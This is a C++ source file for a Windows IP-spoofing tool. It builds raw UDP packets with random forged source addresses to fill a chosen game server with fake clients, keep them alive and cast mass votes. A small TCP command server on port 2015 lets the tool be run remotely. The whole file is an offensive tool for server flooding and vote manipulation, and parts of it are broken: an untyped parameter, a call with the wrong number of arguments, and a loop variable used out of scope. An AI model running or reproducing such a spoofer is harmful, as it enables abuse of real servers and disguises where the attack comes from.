/* Paszczak wrote this v2.0 */

// spoofer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#include "conio.h"

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "spoofer.h"

#include "api.h"



void SendData(const char *pData, int Size, int s)
{
	m_PayloadSize = Size;

	ZeroMemory(m_aMessage, MAX_MESSAGE);

	for (unsigned int i = 0; i < m_PayloadSize; i++)
		m_aMessage[i] = pData[i];

	IP_HDR IP;
	IP.Version = 4;
	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
	IP.DSCP = 0;
	IP.ECN = 1;
	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
	IP.ID = 0;
	IP.Flags = 0;
	IP.FragOffset = 0;
	IP.TTL = 128;
	IP.Protocol = IPPROTO_UDP;
	IP.Checksum = 0;
	IP.SourceIP = m_FromIP[s];
	IP.DestIP = m_ToIP;
	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));

	UDP_HDR UDP;
	UDP.SourcePort = m_FromPort;
	UDP.DestPort = m_ToPort;
	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
	UDP.Checksum = 0;

	char *ptr = NULL;

	m_ChecksumUDP = 0;
	ptr = m_aPacket;
	ZeroMemory(m_aPacket, MAX_PACKET);

	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
	ptr += sizeof(IP.SourceIP);
	m_ChecksumUDP += sizeof(IP.SourceIP);

	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
	ptr += sizeof(IP.DestIP);
	m_ChecksumUDP += sizeof(IP.DestIP);

	ptr++;
	m_ChecksumUDP++;

	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
	ptr += sizeof(IP.Protocol);
	m_ChecksumUDP += sizeof(IP.Protocol);

	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
	ptr += sizeof(UDP.Length);
	m_ChecksumUDP += sizeof(UDP.Length);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);
	m_ChecksumUDP += sizeof(UDP);

	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
		*ptr = m_aMessage[i];
	m_ChecksumUDP += m_PayloadSize;

	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);

	ZeroMemory(m_aPacket, MAX_PACKET);
	ptr = m_aPacket;

	memcpy(ptr, &IP, sizeof(IP));
	ptr += sizeof(IP);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);

	memcpy(ptr, m_aMessage, m_PayloadSize);

	m_Sin.sin_family = AF_INET;
	m_Sin.sin_port = m_ToPort;
	m_Sin.sin_addr.s_addr = m_ToIP;

	int Bytes = sendto(m_Sock[s], m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));



	/*if(Bytes != SOCKET_ERROR)
	std::cout << Bytes << " sent" << std::endl; */


}

bool Create(SOCKET *pSock)
{
	WSADATA data;
	char aBuf[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data))
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSAStartup() failed: %d\n", GetLastError());
		Output(aBuf);
		return false;
	}

	*pSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0, 0);

	if (*pSock == INVALID_SOCKET)
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSASocket() failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	BOOL optvalue = TRUE;

	if (setsockopt(*pSock, IPPROTO_IP, IP_HDRINCL, (char *)&optvalue, sizeof(optvalue)) == SOCKET_ERROR)
	{
		sprintf_s(aBuf, sizeof(aBuf), "setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	sprintf_s(aBuf, sizeof(aBuf), "socket created correctly\n");
	Output(aBuf);

	return true;
}

void Output(char *pBuf)
{
	//FILE *pFile = fopen("Sniffer.txt","a+"); 
	//fprintf(pFile,"%s", pBuf); 
	//fclose(pFile); 
	printf("%s", pBuf);
}

void Close(int s)
{
	closesocket(m_Sock[s]);
	WSACleanup();
	//getchar();
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;

	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);

	return (USHORT)(~cksum);
}


//debug for packet's data
void Debug(unsigned char *buffer, int buffersize)
{
	int i;
	for (i = 0; i < buffersize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");
}

unsigned long genip()
{
	unsigned char *p_ip;
	unsigned long ul_dst;

	p_ip = (unsigned char*)&ul_dst;
	for (int i = 0; i<sizeof(unsigned long); i++)
		*p_ip++ = rand() % 255;
	return ul_dst;
}

void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
{
	AmountofDummies = Amount; // for tick (keep alive)

	int i;
	for(i = 0; i < Amount; i++)
	{
		if (!Create(&m_Sock[i]))
			Close(i);
	}

	for (int k = 0; k < Amount; k++)
	{
		m_FromIP[k] = genip();
	}

	//m_FromIP[0] = inet_addr("192.168.100.10");
    /*m_FromIP[0] = inet_addr("133.37.133.37");
	m_FromIP[1]	= inet_addr("111.111.111.111");
	m_FromIP[2]	= inet_addr("222.222.222.222");
	m_FromIP[3]	= inet_addr("122.122.122.122");
	m_FromIP[4]	= inet_addr("133.133.133.133");
	m_FromIP[5]	= inet_addr("144.144.144.144");
	m_FromIP[6]	= inet_addr("155.155.155.155");
	m_FromIP[7]	= inet_addr("166.166.166.166");*/

	m_FromPort = htons(1111);

	m_ToIP = inet_addr(IP);
	m_ToPort = htons(Port);

	//char message[256];  -- it was for chat ^^
	unsigned char buffer[2048];

	int BufferSize = 0;
	int j = 0;


	for(j = 0; j < Amount; j++)
	{
		Reset(j);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackConnect(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackClientInfo(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackReady(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackSendInfo(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackEnterGame(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		// one alive packet right after joining...
		ZeroMemory(buffer, 2048);
		BufferSize = PackKeepAlive(&buffer[0], i);
		SendData((const char*)buffer, BufferSize, i);

		//Debug(&buffer[0], BufferSize);

		if(Vote)
		{
			ZeroMemory(buffer, 2048);
			BufferSize = PackVote(&buffer[0], i, Vote);
			SendData((const char*)buffer, BufferSize, i);

			//Debug(&buffer[0], BufferSize);
		}
	}
	//Close(0);
}

void DisconnectDummies()
{
	unsigned char buffer[2048];
	int BufferSize = 0;

	int i = 0;

	for(i = 0; i < 64; i++)
	{
		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackDisconnect(&buffer[0], i);
		SendData((const char*)buffer, BufferSize, i);
	}
}

void VoteBot(const char *IP, int Port, Amount, int v)
{
	ConnectDummies(IP, Port, Amount, v);
	m_WantRemoveDummies = true;
}

void Tick()
{
	if (time > 500) //once in 500 ms
	{
		time = 0;

		//printf("KEEPIN ALIVE ...\n");

		unsigned char buffer[2048];

		int BufferSize = 0;

		for (int i = 0; i < AmountofDummies; i++)
		{
			ZeroMemory(buffer, 2048);
			BufferSize = PackKeepAlive(&buffer[0], i);
			SendData((const char*)buffer, BufferSize, i);
		}

		if(m_WantRemoveDummies)
			DisconnectDummies();
	}
	else
		time++;
}

DWORD WINAPI WorkingThread(LPVOID lpParam) 
{
	printf("Created new thread\n");

	SOCKET g_Client = (SOCKET)lpParam; 
	char buffer[256];

	send(g_Client, "Welcome", strlen("Welcome"), 0);

	while(1)
	{
		memset(&buffer, 0, sizeof(buffer));
		
		if(recv(g_Client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
		{
			char aCmd[512][256] = {{0}};
			ZeroMemory(&aCmd, sizeof(aCmd));
			int Cmd = 0;
			int Char = 0;

			for(int i = 0; i < strlen(buffer); i++)
			{
				if(buffer[i] == ' ')
				{
					Cmd++;
					Char = 0;
					continue;
				}

				aCmd[Cmd][Char] = buffer[i];
				Char++;
			}

			if(strcmp(aCmd[0], "status") == 0) // test
			{
				send(g_Client, "Working fine", strlen("Working fine"), 0);
			}
			else if(strcmp(aCmd[0], "dummies") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					ConnectDummies(aCmd[1], Port, Num);

					send(g_Client, "Dummies connected", strlen("Dummies connected"), 0);
				}
				else
					send(g_Client, "Please use: dummies <ip> <port> <num>", strlen("Please use: dummies <ip> <port> <num>"), 0);
			}
			else if(strcmp(aCmd[0], "dcdummies") == 0)
			{
				DisconnectDummies();
				send(g_Client, "Dummies disconnected", strlen("Dummies disconnected"), 0);
			}
			else if(strstr(aCmd[0], "votebot"))
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					int Vote = atoi(aCmd[4]);
					VoteBot(aCmd[1], Port, Num, Vote);

					send(g_Client, "Dummies connected (Voting...)", strlen("Dummies connected (Voting...)"), 0);
				}
				else
					send(g_Client, "Please use: votebot <ip> <port> <num> <vote>", strlen("Please use: votebot <ip> <port> <num> <vote>"), 0);
			}
			else
				send(g_Client, "We don't know this cmd. Try again.", strlen("We don't know this cmd. Try again."), 0);
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD Thread; 
	WSADATA data;
	SOCKET g_Server, g_Client;
	SOCKADDR_IN info, client_info;
	int client_info_length = sizeof(client_info);

	printf("Starting...\n");

	// WSA
	if(WSAStartup(MAKEWORD(2, 0), &data) != 0)
		printf("Error in WSAStartup(): %s\n", WSAGetLastError());

	// Socket
	g_Server = socket(AF_INET, SOCK_STREAM, 0);
	if(g_Server == INVALID_SOCKET)
		printf("Error in socket(): %s\n", WSAGetLastError());

	// Info
	info.sin_addr.s_addr	=	INADDR_ANY;
	info.sin_family			=	AF_INET;
	info.sin_port			=	htons(2015);
	
	// Bind
	if(bind(g_Server, (struct sockaddr*)&info, sizeof(info)) == SOCKET_ERROR)
		printf("Error in bind(): %s\n", WSAGetLastError());

	// Listen
	if(listen(g_Server, 5) == SOCKET_ERROR)
		printf("Error in listen(): %s\n", WSAGetLastError());

	printf("Waiting for clients...\n");

	while(1)
	{
		Tick();
		Sleep(1);

		g_Client = accept(g_Server, (struct sockaddr*)&client_info, &client_info_length);

		if(g_Client != SOCKET_ERROR)
		{
			printf("Client accepted: %s:%i\n", inet_ntoa(client_info.sin_addr), ntohs(client_info.sin_port));
			CreateThread(NULL, 0, WorkingThread, (LPVOID)g_Client, 0, &Thread);
		}
		else
			printf("Error in accept(): %s\n", WSAGetLastError());
	}

	closesocket(g_Server);
	WSACleanup();

	return 0;
}